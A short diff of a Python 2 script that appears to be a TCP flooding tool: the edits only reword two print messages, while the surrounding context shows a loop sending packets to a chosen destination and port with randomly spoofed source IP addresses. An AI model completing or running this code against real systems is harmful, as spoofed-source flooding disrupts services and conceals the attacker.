@@ -21,7 +21,7 @@ if len(sys.argv) < 2: #Display help text
 
 args = vars(args) #Converting to dictionary format
 
-print "Arguments is set as followed:"
+print "Arguments:"
 print "Destination: ", args['destination']
 print "Dest. Port : ", args['port']
 print "Count      : ", args['count']
@@ -49,4 +49,4 @@ else: #Count = 0: Unlimited iterations
 		ip.src = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
 		send(ip/tcp)
 		
-print "All packets send ", stop 
+print "All packets has been sent, ", stop 
